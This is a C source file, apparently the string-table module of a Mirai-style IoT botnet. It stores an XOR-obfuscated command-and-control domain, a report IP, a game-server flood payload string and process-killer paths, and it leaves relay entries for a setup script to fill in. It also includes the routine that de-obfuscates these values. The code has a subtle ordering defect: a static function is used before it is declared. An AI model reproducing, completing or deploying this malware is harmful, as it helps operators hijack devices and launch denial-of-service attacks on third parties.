#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_keys[] = {
    0x38f7f129, 0x4a2a6db, 0x3b608da0, 0x6c34dab4, 0x3a80f431, 0x2893473, 
    0x1988be99, 0x5f980e32, 0x54ae03d6, 0x120f2780, 0x4205ded8, 0x5eb4e0a6, 
    0x40cd53f6, 0x2e9c2a07, 0x365bfa9f, 0x7cf02ecb, 0x1a538d95, 0x7a079f4f, 
    0x12dfa90f, 0x6640d384
};

struct table_value table[TABLE_MAX_KEYS];

static void add_entry(uint8_t id, char *buf, int buf_len);

void table_init(void) {
    add_entry(TABLE_CNC_DOMAIN, "\x41\x45\x42\x44\x4b\x49\x4f\x44\x4f\x45\x4e\x56\x58\x41\x44\x46\x58\x42\x43\x49\x58\x4a", 22);
    add_entry(TABLE_EXEC_SUCCESS, "\x5b\x58\x55\x4f\x4e\x1a\x4e\x55\x1a\x59\x4f\x57\x1a\x53\x54\x49\x53\x5e\x5f\x1a\x5b\x1a\x5c\x5f\x57\x58\x55\x43\x1a\x58\x4e\x4d", 32);
    add_entry(TABLE_ATK_VSE, "\x6e\x69\x55\x4f\x48\x59\x5f\x1a\x7f\x54\x5d\x53\x54\x5f\x1a\x6b\x4f\x5f\x48\x43", 20);
    add_entry(TABLE_KILLER_PROC, "\x15\x4a\x48\x55\x59\x15", 6);
    add_entry(TABLE_KILLER_EXE, "\x15\x5f\x42\x5f", 4);
    add_entry(TABLE_KILLER_FD, "\x15\x5c\x5e", 3);
    add_entry(TABLE_REPORT_IP, "\x2\x3\x14\xb\x3\xa\x14\xb\xf\xc\x14\xb\xe\xf", 14);
    
    // Relay entries (placeholder - will be overwritten by setup.sh)
    add_entry(TABLE_RELAY_1, "", 1);
    add_entry(TABLE_RELAY_2, "", 1);
    add_entry(TABLE_RELAY_3, "", 1);
    add_entry(TABLE_RELAY_4, "", 1);
}

void table_unlock_val(uint8_t id) {
    toggle_obf(id);
}

void table_lock_val(uint8_t id) {
    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len) {
    struct table_value *val = &table[id];

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len) {
    char *cpy;

    if (buf_len > 0) {
        cpy = malloc(buf_len);
        util_memcpy(cpy, buf, buf_len);
    } else {
        cpy = malloc(1);
        if (cpy)
            *cpy = '\0';
    }

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
}


static void toggle_obf(uint8_t id) {
    struct table_value *val = &table[id];

    
    for (int i = 0; i < TABLE_KEY_LEN; i++) {

        uint32_t table_key = table_keys[i];

        uint8_t k1 = table_key & 0xff,
                k2 = (table_key >> 8) & 0xff,
                k3 = (table_key >> 16) & 0xff,
                k4 = (table_key >> 24) & 0xff;

        for (int i = 0; i < val->val_len; i++) {
            val->val[i] ^= k1;
            val->val[i] ^= k2;
            val->val[i] ^= k3;
            val->val[i] ^= k4;
        }
    }

}
